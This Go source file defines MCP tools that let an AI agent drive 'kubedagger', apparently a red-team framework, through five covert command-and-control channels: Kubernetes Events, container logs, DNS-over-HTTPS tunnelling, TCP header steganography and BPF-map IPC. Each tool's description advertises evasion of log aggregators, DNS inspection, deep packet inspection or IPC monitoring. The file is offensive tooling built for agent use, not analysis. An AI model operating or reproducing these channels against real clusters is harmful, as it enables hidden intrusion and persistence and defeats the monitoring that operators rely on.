package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

// K8s Event C2

type K8sEventC2Input struct {
	Action    string `json:"action"`
	Namespace string `json:"namespace,omitempty"`
	Object    string `json:"object,omitempty"`
	Data      string `json:"data,omitempty"`
}

type K8sEventC2Tool struct {
	exec executor.Executor
}

func NewK8sEventC2(exec executor.Executor) *K8sEventC2Tool {
	return &K8sEventC2Tool{exec: exec}
}

func (t *K8sEventC2Tool) Name() string { return "kubedagger_k8s_event_c2" }

func (t *K8sEventC2Tool) Description() string {
	return "Use Kubernetes Events as a covert C2 channel. Commands are encoded in event messages and responses in event annotations. Blends with normal cluster event traffic and persists only briefly in etcd."
}

func (t *K8sEventC2Tool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["send", "receive", "setup", "teardown"],
				"description": "C2 channel action"
			},
			"namespace": {
				"type": "string",
				"description": "Namespace for event objects"
			},
			"object": {
				"type": "string",
				"description": "Object reference for events"
			},
			"data": {
				"type": "string",
				"description": "Data to send via event channel"
			}
		},
		"required": ["action"]
	}`)
}

func (t *K8sEventC2Tool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input K8sEventC2Input
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateNamespace(input.Namespace); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Object, "object"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Data, "data"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"k8s-event-c2", "--action", input.Action}
	if input.Namespace != "" {
		args = append(args, "--namespace", input.Namespace)
	}
	if input.Object != "" {
		args = append(args, "--object", input.Object)
	}
	if input.Data != "" {
		args = append(args, "--data", input.Data)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger k8s-event-c2 failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger K8s Event C2: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("Channel active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}

// Container Log C2

type ContainerLogC2Input struct {
	Action    string `json:"action"`
	Pod       string `json:"pod,omitempty"`
	Namespace string `json:"namespace,omitempty"`
	Data      string `json:"data,omitempty"`
}

type ContainerLogC2Tool struct {
	exec executor.Executor
}

func NewContainerLogC2(exec executor.Executor) *ContainerLogC2Tool {
	return &ContainerLogC2Tool{exec: exec}
}

func (t *ContainerLogC2Tool) Name() string { return "kubedagger_container_log_c2" }

func (t *ContainerLogC2Tool) Description() string {
	return "Use container stdout/stderr logs as a covert C2 channel. Steganographically encodes commands in log output that appears normal to log aggregators but carries C2 payloads."
}

func (t *ContainerLogC2Tool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["send", "receive", "setup", "teardown"],
				"description": "C2 channel action"
			},
			"pod": {
				"type": "string",
				"description": "Pod to use for log channel"
			},
			"namespace": {
				"type": "string",
				"description": "Pod namespace"
			},
			"data": {
				"type": "string",
				"description": "Data to encode in logs"
			}
		},
		"required": ["action"]
	}`)
}

func (t *ContainerLogC2Tool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input ContainerLogC2Input
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Pod, "pod"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateNamespace(input.Namespace); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Data, "data"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"container-log-c2", "--action", input.Action}
	if input.Pod != "" {
		args = append(args, "--pod", input.Pod)
	}
	if input.Namespace != "" {
		args = append(args, "--namespace", input.Namespace)
	}
	if input.Data != "" {
		args = append(args, "--data", input.Data)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger container-log-c2 failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger Container Log C2: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("Channel active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}

// DoH C2

type DoHC2Input struct {
	Action   string `json:"action"`
	Resolver string `json:"resolver,omitempty"`
	Domain   string `json:"domain,omitempty"`
	Data     string `json:"data,omitempty"`
}

type DoHC2Tool struct {
	exec executor.Executor
}

func NewDoHC2(exec executor.Executor) *DoHC2Tool {
	return &DoHC2Tool{exec: exec}
}

func (t *DoHC2Tool) Name() string { return "kubedagger_doh_c2" }

func (t *DoHC2Tool) Description() string {
	return "DNS-over-HTTPS C2 channel that tunnels commands through encrypted DoH queries to public resolvers. Traffic appears as normal HTTPS to DNS services, bypassing DNS inspection and network policies."
}

func (t *DoHC2Tool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["send", "receive", "setup", "teardown"],
				"description": "C2 channel action"
			},
			"resolver": {
				"type": "string",
				"description": "DoH resolver URL"
			},
			"domain": {
				"type": "string",
				"description": "Domain for DNS tunneling"
			},
			"data": {
				"type": "string",
				"description": "Data to send via DoH"
			}
		},
		"required": ["action"]
	}`)
}

func (t *DoHC2Tool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input DoHC2Input
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Resolver, "resolver"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Domain, "domain"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Data, "data"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"doh-c2", "--action", input.Action}
	if input.Resolver != "" {
		args = append(args, "--resolver", input.Resolver)
	}
	if input.Domain != "" {
		args = append(args, "--domain", input.Domain)
	}
	if input.Data != "" {
		args = append(args, "--data", input.Data)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger doh-c2 failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger DoH C2: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("Channel active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}

// TCP Stego

type TCPStegoInput struct {
	Action   string `json:"action"`
	Target   string `json:"target,omitempty"`
	Port     int    `json:"port,omitempty"`
	Data     string `json:"data,omitempty"`
	Method   string `json:"method,omitempty"`
}

type TCPStegoTool struct {
	exec executor.Executor
}

func NewTCPStego(exec executor.Executor) *TCPStegoTool {
	return &TCPStegoTool{exec: exec}
}

func (t *TCPStegoTool) Name() string { return "kubedagger_tcp_stego" }

func (t *TCPStegoTool) Description() string {
	return "Hide C2 data in TCP header fields (sequence numbers, timestamps, window sizes) using steganography. Data is embedded in legitimate-looking TCP flows that pass deep packet inspection."
}

func (t *TCPStegoTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["send", "receive", "setup", "teardown"],
				"description": "Stego channel action"
			},
			"target": {
				"type": "string",
				"description": "Target host for stego traffic"
			},
			"port": {
				"type": "integer",
				"description": "Target port"
			},
			"data": {
				"type": "string",
				"description": "Data to embed"
			},
			"method": {
				"type": "string",
				"enum": ["seq", "timestamp", "window", "urgent"],
				"description": "Steganography method"
			}
		},
		"required": ["action"]
	}`)
}

func (t *TCPStegoTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input TCPStegoInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.Target, "target"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Data, "data"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"tcp-stego", "--action", input.Action}
	if input.Target != "" {
		args = append(args, "--target", input.Target)
	}
	if input.Port > 0 {
		args = append(args, "--port", fmt.Sprintf("%d", input.Port))
	}
	if input.Data != "" {
		args = append(args, "--data", input.Data)
	}
	if input.Method != "" {
		args = append(args, "--method", input.Method)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger tcp-stego failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger TCP Stego: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("Channel active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}

// BPF IPC

type BPFIPCInput struct {
	Action  string `json:"action"`
	MapName string `json:"map_name,omitempty"`
	Data    string `json:"data,omitempty"`
}

type BPFIPCTool struct {
	exec executor.Executor
}

func NewBPFIPC(exec executor.Executor) *BPFIPCTool {
	return &BPFIPCTool{exec: exec}
}

func (t *BPFIPCTool) Name() string { return "kubedagger_bpf_ipc" }

func (t *BPFIPCTool) Description() string {
	return "Use BPF maps as an inter-process communication channel between kernel-space eBPF programs and userspace agents. Provides a covert shared-memory channel invisible to standard IPC monitoring tools."
}

func (t *BPFIPCTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["send", "receive", "create", "destroy", "status"],
				"description": "BPF IPC action"
			},
			"map_name": {
				"type": "string",
				"description": "BPF map name for IPC"
			},
			"data": {
				"type": "string",
				"description": "Data to write to BPF map"
			}
		},
		"required": ["action"]
	}`)
}

func (t *BPFIPCTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input BPFIPCInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.MapName, "map_name"); err != nil {
		return errorResult(err.Error()), nil
	}
	if err := validateSafeString(input.Data, "data"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"bpf-ipc", "--action", input.Action}
	if input.MapName != "" {
		args = append(args, "--map-name", input.MapName)
	}
	if input.Data != "" {
		args = append(args, "--data", input.Data)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger bpf-ipc failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	fmt.Fprintf(&sb, "## KubeDagger BPF IPC: %s\n\n", input.Action)
	if output == "" {
		sb.WriteString("IPC channel active.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
